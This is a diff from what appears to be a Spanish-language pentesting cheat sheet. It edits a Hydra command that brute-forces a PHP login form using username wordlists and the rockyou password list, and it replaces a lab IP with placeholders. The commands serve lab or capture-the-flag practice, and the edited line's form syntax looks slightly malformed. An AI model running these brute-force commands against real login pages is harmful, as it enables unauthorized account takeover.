@@ -19,7 +19,7 @@ hydra -l USER -P archivo.txt<IP> http-post-form  "/login.php:username=^USER^&pas
 ## Para login php con mensaje:
 
 ```bash
-hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P ../rockyou.txt 172.17.0.2 http-post-form '/DIRECCION:username=^USER^&password=^PASS^:F=Mensaje despues de inssertar creds incorrectas.' -F -V -t 64 -I -u
+hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P ../rockyou.txt <DOMAIN> http-post-form '/ENDPOINT:username=^USER^&password=^PASS^=login:Mensaje despues de inssertar creds incorrectas.'
 ```
 
 ## mp64
